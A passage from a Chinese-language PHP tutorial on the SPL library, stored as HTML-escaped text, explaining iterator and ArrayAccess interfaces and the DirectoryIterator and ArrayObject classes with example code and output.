$this-&amp;gt;valid = (FALSE !== reset($this-&amp;gt;array));&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n   /**&lt;br /&gt;\r\n   * Return the current array element&lt;br /&gt;\r\n   */&lt;br /&gt;\r\n function current(){&lt;br /&gt;\r\n   return current($this-&amp;gt;array);&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n   /**&lt;br /&gt;\r\n   * Return the key of the current array element&lt;br /&gt;\r\n   */&lt;br /&gt;\r\n function key(){&lt;br /&gt;\r\n   return key($this-&amp;gt;array);&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n   /**&lt;br /&gt;\r\n   * Move forward by one&lt;br /&gt;\r\n   * PHP''s next() returns false if there are no more elements&lt;br /&gt;\r\n   */&lt;br /&gt;\r\n function next(){&lt;br /&gt;\r\n   $this-&amp;gt;valid = (FALSE !== next($this-&amp;gt;array));&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n   /**&lt;br /&gt;\r\n   * Is the current element valid?&lt;br /&gt;\r\n   */&lt;br /&gt;\r\n function valid(){&lt;br /&gt;\r\n   return $this-&amp;gt;valid;&lt;br /&gt;\r\n }&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;使用方法如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;// Create iterator object&lt;br /&gt;\r\n$colors = new ArrayReloaded(array (''red'',''green'',''blue'',));&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Iterate away!&lt;br /&gt;\r\nforeach ( $colors as $color ) {&lt;br /&gt;\r\n echo $color.&quot;&amp;lt;br&amp;gt;&quot;;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;你也可以在foreach循环中使用key()方法：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;// Display the keys as well&lt;br /&gt;\r\nforeach ( $colors as $key =&amp;gt; $color ) {&lt;br /&gt;\r\n echo &quot;$key: $color&amp;lt;br&amp;gt;&quot;;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;除了foreach循环外，也可以使用while循环，&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;// Reset the iterator - foreach does this automatically&lt;br /&gt;\r\n$colors-&amp;gt;rewind();&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Loop while valid&lt;br /&gt;\r\nwhile ( $colors-&amp;gt;valid() ) {&lt;br /&gt;\r\n&lt;br /&gt;\r\n   echo $colors-&amp;gt;key().&quot;: &quot;.$colors-&amp;gt;current().&quot;&lt;br /&gt;\r\n&quot;;&lt;br /&gt;\r\n   $colors-&amp;gt;next();&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;根据测试，while循环要稍快于foreach循环，因为运行时少了一层中间调用。&lt;/div&gt;\r\n&lt;strong&gt;4. ArrayAccess界面&lt;/strong&gt; &lt;div&gt;部署ArrayAccess界面，可以使得object像array那样操作。ArrayAccess界面包含四个必须部署的方法：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;    * offsetExists($offset)&lt;br /&gt;\r\n&lt;br /&gt;\r\n      This method is used to tell php if there is a value&lt;br /&gt;\r\n      for the key specified by offset. It should return &lt;br /&gt;\r\n      true or false.&lt;br /&gt;\r\n&lt;br /&gt;\r\n    * offsetGet($offset)&lt;br /&gt;\r\n&lt;br /&gt;\r\n      This method is used to return the value specified &lt;br /&gt;\r\n      by the key offset.&lt;br /&gt;\r\n&lt;br /&gt;\r\n    * offsetSet($offset, $value)&lt;br /&gt;\r\n&lt;br /&gt;\r\n      This method is used to set a value within the object, &lt;br /&gt;\r\n      you can throw an exception from this function for a &lt;br /&gt;\r\n      read-only collection.&lt;br /&gt;\r\n&lt;br /&gt;\r\n    * offsetUnset($offset)&lt;br /&gt;\r\n&lt;br /&gt;\r\n      This method is used when a value is removed from &lt;br /&gt;\r\n      an array either through unset() or assigning the key &lt;br /&gt;\r\n      a value of null. In the case of numerical arrays, this &lt;br /&gt;\r\n      offset should not be deleted and the array should &lt;br /&gt;\r\n      not be reindexed unless that is specifically the &lt;br /&gt;\r\n      behavior you want.&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;下面就是一个部署ArrayAccess界面的实例：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;/**&lt;br /&gt;\r\n* A class that can be used like an array&lt;br /&gt;\r\n*/&lt;br /&gt;\r\nclass Article implements ArrayAccess {&lt;br /&gt;\r\n&lt;br /&gt;\r\n public $title;&lt;br /&gt;\r\n&lt;br /&gt;\r\n public $author;&lt;br /&gt;\r\n&lt;br /&gt;\r\n public $category;  &lt;br /&gt;\r\n&lt;br /&gt;\r\n function __construct($title,$author,$category) {&lt;br /&gt;\r\n   $this-&amp;gt;title = $title;&lt;br /&gt;\r\n   $this-&amp;gt;author = $author;&lt;br /&gt;\r\n   $this-&amp;gt;category = $category;&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n /**&lt;br /&gt;\r\n * Defined by ArrayAccess interface&lt;br /&gt;\r\n * Set a value given it''s key e.g. $A[''title''] = ''foo'';&lt;br /&gt;\r\n * @param mixed key (string or integer)&lt;br /&gt;\r\n * @param mixed value&lt;br /&gt;\r\n * @return void&lt;br /&gt;\r\n */&lt;br /&gt;\r\n function offsetSet($key, $value) {&lt;br /&gt;\r\n   if ( array_key_exists($key,get_object_vars($this)) ) {&lt;br /&gt;\r\n     $this-&amp;gt;{$key} = $value;&lt;br /&gt;\r\n   }&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n /**&lt;br /&gt;\r\n * Defined by ArrayAccess interface&lt;br /&gt;\r\n * Return a value given it''s key e.g. echo $A[''title''];&lt;br /&gt;\r\n * @param mixed key (string or integer)&lt;br /&gt;\r\n * @return mixed value&lt;br /&gt;\r\n */&lt;br /&gt;\r\n function offsetGet($key) {&lt;br /&gt;\r\n   if ( array_key_exists($key,get_object_vars($this)) ) {&lt;br /&gt;\r\n     return $this-&amp;gt;{$key};&lt;br /&gt;\r\n   }&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n /**&lt;br /&gt;\r\n * Defined by ArrayAccess interface&lt;br /&gt;\r\n * Unset a value by it''s key e.g. unset($A[''title'']);&lt;br /&gt;\r\n * @param mixed key (string or integer)&lt;br /&gt;\r\n * @return void&lt;br /&gt;\r\n */&lt;br /&gt;\r\n function offsetUnset($key) {&lt;br /&gt;\r\n   if ( array_key_exists($key,get_object_vars($this)) ) {&lt;br /&gt;\r\n     unset($this-&amp;gt;{$key});&lt;br /&gt;\r\n   }&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n /**&lt;br /&gt;\r\n * Defined by ArrayAccess interface&lt;br /&gt;\r\n * Check value exists, given it''s key e.g. isset($A[''title''])&lt;br /&gt;\r\n * @param mixed key (string or integer)&lt;br /&gt;\r\n * @return boolean&lt;br /&gt;\r\n */&lt;br /&gt;\r\n function offsetExists($offset) {&lt;br /&gt;\r\n   return array_key_exists($offset,get_object_vars($this));&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;使用方法如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;// Create the object&lt;br /&gt;\r\n$A = new Article(''SPL Rocks'',''Joe Bloggs'', ''PHP'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Check what it looks like&lt;br /&gt;\r\necho ''Initial State:&amp;lt;div&amp;gt;'';&lt;br /&gt;\r\nprint_r($A);&lt;br /&gt;\r\necho ''&amp;lt;/div&amp;gt;'';&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Change the title using array syntax&lt;br /&gt;\r\n$A[''title''] = ''SPL _really_ rocks'';&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Try setting a non existent property (ignored)&lt;br /&gt;\r\n$A[''not found''] = 1;&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Unset the author field&lt;br /&gt;\r\nunset($A[''author'']);&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Check what it looks like again&lt;br /&gt;\r\necho ''Final State:&amp;lt;div&amp;gt;'';&lt;br /&gt;\r\nprint_r($A);&lt;br /&gt;\r\necho ''&amp;lt;/div&amp;gt;'';&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;运行结果如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;Initial State:&lt;br /&gt;\r\n&lt;br /&gt;\r\nArticle Object&lt;br /&gt;\r\n(&lt;br /&gt;\r\n   [title] =&amp;gt; SPL Rocks&lt;br /&gt;\r\n   [author] =&amp;gt; Joe Bloggs&lt;br /&gt;\r\n   [category] =&amp;gt; PHP&lt;br /&gt;\r\n)&lt;br /&gt;\r\n&lt;br /&gt;\r\nFinal State:&lt;br /&gt;\r\n&lt;br /&gt;\r\nArticle Object&lt;br /&gt;\r\n(&lt;br /&gt;\r\n   [title] =&amp;gt; SPL _really_ rocks&lt;br /&gt;\r\n   [category] =&amp;gt; PHP&lt;br /&gt;\r\n)&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;可以看到，$A虽然是一个object，但是完全可以像array那样操作。&lt;/div&gt;\r\n&lt;div&gt;你还可以在读取数据时，增加程序内部的逻辑：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;function offsetGet($key) {&lt;br /&gt;\r\n   if ( array_key_exists($key,get_object_vars($this)) ) {&lt;br /&gt;\r\n     return strtolower($this-&amp;gt;{$key});&lt;br /&gt;\r\n   }&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;5. IteratorAggregate界面&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;但是，虽然$A可以像数组那样操作，却无法使用foreach遍历，除非部署了前面提到的Iterator界面。&lt;/div&gt;\r\n&lt;div&gt;另一个解决方法是，有时会需要将数据和遍历部分分开，这时就可以部署IteratorAggregate界面。它规定了一个getIterator()方法，返回一个使用Iterator界面的object。&lt;/div&gt;\r\n&lt;div&gt;还是以上一节的Article类为例：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;class Article implements ArrayAccess, IteratorAggregate {&lt;br /&gt;\r\n&lt;br /&gt;\r\n/**&lt;br /&gt;\r\n * Defined by IteratorAggregate interface&lt;br /&gt;\r\n * Returns an iterator for for this object, for use with foreach&lt;br /&gt;\r\n * @return ArrayIterator&lt;br /&gt;\r\n */&lt;br /&gt;\r\n function getIterator() {&lt;br /&gt;\r\n   return new ArrayIterator($this);&lt;br /&gt;\r\n }&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;使用方法如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;$A = new Article(''SPL Rocks'',''Joe Bloggs'', ''PHP'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Loop (getIterator will be called automatically)&lt;br /&gt;\r\necho ''Looping with foreach:&amp;lt;div&amp;gt;'';&lt;br /&gt;\r\nforeach ( $A as $field =&amp;gt; $value ) {&lt;br /&gt;\r\n echo &quot;$field : $value&amp;lt;br&amp;gt;&quot;;&lt;br /&gt;\r\n}&lt;br /&gt;\r\necho ''&amp;lt;/div&amp;gt;'';&lt;br /&gt;\r\n&lt;br /&gt;\r\n// Get the size of the iterator (see how many properties are left)&lt;br /&gt;\r\necho &quot;Object has &quot;.sizeof($A-&amp;gt;getIterator()).&quot; elements&quot;;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;显示结果如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;Looping with foreach:&lt;br /&gt;\r\n&lt;br /&gt;\r\ntitle : SPL Rocks&lt;br /&gt;\r\nauthor : Joe Bloggs&lt;br /&gt;\r\ncategory : PHP&lt;br /&gt;\r\n&lt;br /&gt;\r\nObject has 3 elements&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;6. RecursiveIterator界面&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;这个界面用于遍历多层数据，它继承了Iterator界面，因而也具有标准的current()、key()、next()、 rewind()和valid()方法。同时，它自己还规定了getChildren()和hasChildren()方法。The getChildren() method must return an object that implements RecursiveIterator.&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;7. SeekableIterator界面&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;SeekableIterator界面也是Iterator界面的延伸，除了Iterator的5个方法以外，还规定了seek()方法，参数是元素的位置，返回该元素。如果该位置不存在，则抛出OutOfBoundsException。&lt;/div&gt;\r\n&lt;div&gt;下面是一个是实例：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\nclass PartyMemberIterator implements SeekableIterator&lt;br /&gt;\r\n{&lt;br /&gt;\r\n    public function __construct(PartyMember $member)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n        // Store $member locally for iteration&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n&lt;br /&gt;\r\n    public function seek($index)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n        $this-&amp;gt;rewind();&lt;br /&gt;\r\n        $position = 0;&lt;br /&gt;\r\n&lt;br /&gt;\r\n        while ($position &amp;lt; $index &amp;amp;&amp;amp; $this-&amp;gt;valid()) {&lt;br /&gt;\r\n            $this-&amp;gt;next();&lt;br /&gt;\r\n            $position++;&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n&lt;br /&gt;\r\n        if (!$this-&amp;gt;valid()) {&lt;br /&gt;\r\n            throw new OutOfBoundsException(''Invalid position'');&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n&lt;br /&gt;\r\n    // Implement current(), key(), next(), rewind()&lt;br /&gt;\r\n    // and valid() to iterate over data in $member&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;8. Countable界面&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;这个界面规定了一个count()方法，返回结果集的数量。&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;第三部分 SPL Classes&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;9. SPL的内置类&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;SPL除了定义一系列Interfaces以外，还提供一系列的内置类，它们对应不同的任务，大大简化了编程。&lt;/div&gt;\r\n&lt;div&gt;查看所有的内置类，可以使用下面的代码：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n// a simple foreach() to traverse the SPL class names&lt;br /&gt;\r\nforeach(spl_classes() as $key=&amp;gt;$value)&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        echo $key.'' -&amp;amp;gt; ''.$value.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;10. DirectoryIterator类&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;这个类用来查看一个目录中的所有文件和子目录：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry{&lt;br /&gt;\r\n  /*** class create new DirectoryIterator Object ***/&lt;br /&gt;\r\n    foreach ( new DirectoryIterator(''./'') as $Item )&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        echo $Item.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n/*** if an exception is thrown, catch it here ***/&lt;br /&gt;\r\ncatch(Exception $e){&lt;br /&gt;\r\n    echo ''No files Found!&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n}&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;查看文件的详细信息：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;table&amp;gt;&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\nforeach(new DirectoryIterator(''./'' ) as $file )&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    if( $file-&amp;gt;getFilename()  == ''foo.txt'' )&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getFilename()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getFilename()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n    echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getBasename()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getBasename()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;isDot()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;isDot()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;__toString()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;__toString()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getPath()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getPath()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getPathname()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getPathname()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getPerms()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getPerms()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getInode()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getInode()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getSize()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getSize()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getOwner()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getOwner()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;$file-&amp;gt;getGroup()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getGroup()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getATime()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getATime()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getMTime()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getMTime()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getCTime()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getCTime()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getType()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getType()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;isWritable()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;isWritable()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;isReadable()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;isReadable()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;isExecutable(&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;isExecutable()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;isFile()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;isFile()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;isDir()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;isDir()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;isLink()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;isLink()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getFileInfo()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getFileInfo()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;getPathInfo()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;getPathInfo()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;openFile()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;openFile()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;setFileClass()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;setFileClass()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        echo ''&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;setInfoClass()&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; ''; var_dump($file-&amp;gt;setInfoClass()); echo ''&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;'';&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n}&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&amp;lt;/table&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;除了foreach循环外，还可以使用while循环：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n/*** create a new iterator object ***/&lt;br /&gt;\r\n$it = new DirectoryIterator(''./'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** loop directly over the object ***/&lt;br /&gt;\r\nwhile($it-&amp;gt;valid())&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $it-&amp;gt;key().'' -- ''.$it-&amp;gt;current().''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n    /*** move to the next iteration ***/&lt;br /&gt;\r\n    $it-&amp;gt;next();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;如果要过滤所有子目录，可以在valid()方法中过滤：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n/*** create a new iterator object ***/&lt;br /&gt;\r\n$it = new DirectoryIterator(''./'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** loop directly over the object ***/&lt;br /&gt;\r\nwhile($it-&amp;gt;valid())&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        /*** check if value is a directory ***/&lt;br /&gt;\r\n        if($it-&amp;gt;isDir())&lt;br /&gt;\r\n                {&lt;br /&gt;\r\n                /*** echo the key and current value ***/&lt;br /&gt;\r\n                echo $it-&amp;gt;key().'' -- ''.$it-&amp;gt;current().''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n                }&lt;br /&gt;\r\n        /*** move to the next iteration ***/&lt;br /&gt;\r\n        $it-&amp;gt;next();&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;11. ArrayObject类&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;这个类可以将Array转化为object。&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** a simple array ***/&lt;br /&gt;\r\n$array = array(''koala'', ''kangaroo'', ''wombat'', ''wallaby'', ''emu'', ''kiwi'', ''kookaburra'', ''platypus'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** create the array object ***/&lt;br /&gt;\r\n$arrayObj = new ArrayObject($array);&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** iterate over the array ***/&lt;br /&gt;\r\nfor($iterator = $arrayObj-&amp;gt;getIterator();&lt;br /&gt;\r\n   /*** check if valid ***/&lt;br /&gt;\r\n   $iterator-&amp;gt;valid();&lt;br /&gt;\r\n   /*** move to the next array member ***/&lt;br /&gt;\r\n   $iterator-&amp;gt;next())&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    /*** output the key and current array value ***/&lt;br /&gt;\r\n    echo $iterator-&amp;gt;key() . '' =&amp;gt; '' . $iterator-&amp;gt;current() . ''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n    }&lt;br 